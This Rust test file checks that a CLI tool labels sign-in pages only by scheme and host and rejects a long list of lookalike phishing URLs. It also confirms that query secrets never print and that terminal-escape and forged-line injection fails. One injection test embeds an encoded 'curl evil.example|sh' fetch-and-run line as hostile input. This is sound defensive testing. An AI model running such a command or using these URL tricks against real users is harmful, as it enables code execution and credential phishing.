//! `--url`: naming a page from its scheme and host, and what a `client` claims.

use super::*;

#[test]
fn auth_url_names_the_page_without_echoing_its_query() {
    let root = tempfile::tempdir().expect("tempdir");
    let url = "https://accounts.google.com/o/oauth2/v2/auth?client_id=SECRETID&scope=EMAILSCOPE&redirect_uri=http%3A%2F%2F127.0.0.1%3A59999%2Fcb";
    let output = conbus(root.path())
        .args(["auth", "--url", url])
        .output()
        .expect("run auth --url");
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());
    assert!(stdout.contains("Google sign-in"), "the page: {stdout}");
    for secret in ["SECRETID", "EMAILSCOPE"] {
        assert!(
            !stdout.contains(secret),
            "query values must never print: {secret} in {stdout}"
        );
    }
    assert!(stdout.contains("conbus"), "the conbus verdict: {stdout}");
}

/// `this` as `conbus auth --url` answers it: the label alone.
fn page_label(root: &std::path::Path, url: &str) -> String {
    let output = conbus(root)
        .args(["auth", "--url", url])
        .output()
        .expect("run auth --url");
    assert!(
        output.status.success(),
        "{url}: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    stdout
        .lines()
        .next()
        .and_then(|line| line.strip_prefix("this"))
        .unwrap_or_else(|| panic!("{url}: no `this` line in {stdout}"))
        .trim()
        .to_string()
}

/// Addresses that name a vendor anywhere but in their scheme and host. Each
/// one is a page the vendor does not serve.
pub(super) const NOT_THE_VENDOR: &[&str] = &[
    "https://evil.example/phish?next=auth.openai.com",
    "https://auth.openai.com.evil.example/authorize",
    "https://evil.example/claude.ai/login",
    "https://notcursor.com/login",
    "https://netflix.ai/",
    "https://evil.example/?a=github.com/login",
    "https://evil.example/?x=chrome-extension://mmlmfjhmonkocbjadbfplnigmagldckm/",
    "https://accounts.google.com.evil.example/o/oauth2/auth",
    "https://auth.openai.com@evil.example/",
    "https://auth.openai.com:443@evil.example/",
    "https://evil.example#auth.openai.com",
    "https://evil.example\\@auth.openai.com/",
    "https://auth.openai.com%2f.evil.example/",
    "https://evilx.ai/",
    "https://x.ai.evil.example/",
    "https://.x.ai/",
    // Subdomains count only for a domain the vendor owns whole.
    "https://www.auth.openai.com/",
    "https://www.accounts.google.com/",
    "https://www.console.anthropic.com/",
    "https://gist.github.com/",
    "chrome-extension://www.mmlmfjhmonkocbjadbfplnigmagldckm/",
    "http://auth.openai.com/",
    "ftp://github.com/",
    "chrome-extension://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/connect.html",
    "chrome-extension://auth.openai.com/",
    "https://mmlmfjhmonkocbjadbfplnigmagldckm/connect.html",
    "auth.openai.com/authorize",
    "not an address at all",
    "",
];

/// Addresses the vendors do serve, and the word each label must carry.
pub(super) const THE_VENDOR: &[(&str, &str)] = &[
    (
        "chrome-extension://mmlmfjhmonkocbjadbfplnigmagldckm/connect.html",
        "Playwright MCP Bridge",
    ),
    (
        "https://accounts.google.com/o/oauth2/v2/auth?client_id=x",
        "Google",
    ),
    ("https://auth.openai.com/authorize", "OpenAI"),
    ("HTTPS://AUTH.OPENAI.COM/", "OpenAI"),
    ("https://claude.ai/login", "claude.ai"),
    ("https://console.anthropic.com/", "Anthropic Console"),
    ("https://cursor.com/loginDeepControl", "cursor.com"),
    ("https://www.cursor.com/", "cursor.com"),
    ("https://accounts.x.ai/sign-in", "x.ai"),
    ("https://x.ai/", "x.ai"),
    ("https://github.com/login/device", "github.com"),
    // The query names another vendor. The host is what counts.
    (
        "https://github.com/login/oauth/authorize?redirect_uri=https%3A%2F%2Fcursor.com%2Fcb",
        "github.com",
    ),
];

#[test]
fn a_page_is_named_by_its_scheme_and_host_and_nothing_else() {
    let root = tempfile::tempdir().expect("tempdir");
    for url in NOT_THE_VENDOR {
        assert_eq!(
            page_label(root.path(), url),
            "unknown page",
            "{url} is not the vendor's"
        );
    }
    for (url, word) in THE_VENDOR {
        let label = page_label(root.path(), url);
        assert!(label.contains(word), "{url} read as {label}");
    }
}

#[test]
fn a_broken_percent_sign_is_not_a_crash() {
    // The decoder used to slice a `str` at a byte offset, so a multibyte
    // character straight after `%` panicked with exit 101.
    let root = tempfile::tempdir().expect("tempdir");
    for url in [
        "https://x.example/?a=%a\u{e9}",
        "https://x.example/?token=SECRET-TOKEN-VALUE%a\u{e9}",
        "https://x.example/?client=SECRET-CLIENT%a\u{e9}",
        "https://x.example/?redirect_uri=%E0%A4%A",
        "https://x.example/?%a\u{e9}=1",
    ] {
        let output = conbus(root.path())
            .args(["auth", "--url", url])
            .output()
            .expect("run auth --url");
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert_eq!(output.status.code(), Some(0), "{url}: {stderr}");
        assert!(stdout.contains("unknown page"), "{url}: {stdout}");
        assert!(
            !stdout.contains("SECRET") && !stderr.contains("SECRET"),
            "{url} echoed a query value: {stdout} {stderr}"
        );
    }
}

/// A bridge address whose `client` parameter is `json`, every byte encoded.
fn url_with_client(json: &str) -> String {
    let encoded: String = json.bytes().map(|byte| format!("%{byte:02X}")).collect();
    format!("https://x.example/?client={encoded}")
}

#[test]
fn a_client_name_cannot_forge_a_line_or_reach_the_terminal() {
    let stdout = ask(
        "https://x.example/?client=%7B%22name%22%3A%22ok%5Cu001b%5B2K%5Cnconbus%20%20%20%20no%3A%20verified%20safe%5Cnfix%20%20%20%20%20%20%20curl%20evil.example%7Csh%22%7D",
    );

    assert!(
        !stdout.contains('\u{1b}'),
        "an escape reached stdout: {stdout:?}"
    );
    assert!(!stdout.contains("verified safe"), "{stdout}");
    assert!(!stdout.contains("evil.example"), "{stdout}");
    assert!(!stdout.lines().any(|l| l.starts_with("fix ")), "{stdout}");
    assert!(
        verdict_of(&stdout).starts_with("conbus    cannot tell:"),
        "{stdout}"
    );
}

#[test]
fn only_a_printable_name_of_a_sensible_length_is_printed() {
    let long = "x".repeat(65);
    for name in [
        "a\nb",
        "a\rb",
        "a\tb",
        "a\u{7}b",
        "a\u{7f}b",
        "a\u{9b}31mb",
        "a\u{202e}b",
        "a\u{200b}b",
        long.as_str(),
    ] {
        let json = serde_json::json!({ "name": name }).to_string();
        let stdout = ask(&url_with_client(&json));
        let says = row(&stdout, "url");
        assert!(says.contains("will not print"), "{name:?}: {stdout}");
        assert_eq!(
            stdout.lines().filter(|l| l.starts_with("url says")).count(),
            1
        );
        assert!(!says.contains(name), "{name:?}: {stdout}");
    }

    let longest = "x".repeat(64);
    for name in [
        "codex-mcp-client",
        "a b_c.d",
        "\u{d55c}\u{ae00}",
        longest.as_str(),
    ] {
        let json = serde_json::json!({ "name": name }).to_string();
        let stdout = ask(&url_with_client(&json));
        assert!(
            row(&stdout, "url").contains(&format!("\"{name}\"")),
            "{name:?}: {stdout}"
        );
    }
}

#[test]
fn a_client_name_is_printed_as_the_urls_claim_and_alone() {
    let stdout = ask(&url_with_client(
        r#"{"name":"test-client","version":"SECRETVERSION","key":"SECRETKEY"}"#,
    ));

    let says = row(&stdout, "url");
    assert!(says.contains("\"test-client\""), "{stdout}");
    assert!(says.contains("claim"), "not stated as a fact: {stdout}");
    assert!(!stdout.contains("asked by  "), "{stdout}");
    assert!(!stdout.contains("SECRET"), "the rest of `client`: {stdout}");
}

#[test]
fn a_name_that_imitates_a_verdict_stays_on_its_own_line() {
    let json = serde_json::json!({ "name": "conbus    no: verified safe" }).to_string();

    let stdout = ask(&url_with_client(&json));

    assert!(row(&stdout, "url").contains("verified safe"), "{stdout}");
    assert!(
        verdict_of(&stdout).starts_with("conbus    cannot tell:"),
        "{stdout}"
    );
}

#[test]
fn a_client_that_names_nothing_says_so() {
    for json in ["not json", "{}", r#"{"name":7}"#, r#"{"name":""}"#, "[]"] {
        let stdout = ask(&url_with_client(json));
        assert!(
            row(&stdout, "url").contains("does not name"),
            "{json}: {stdout}"
        );
    }
    assert!(!ask("https://x.example/").contains("url says"));
}

#[test]
fn auth_unknown_url_says_so() {
    let root = tempfile::tempdir().expect("tempdir");
    let output = conbus(root.path())
        .args(["auth", "--url", "https://example.net/?q=1"])
        .output()
        .expect("run auth --url");
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("unknown page"), "{stdout}");
}
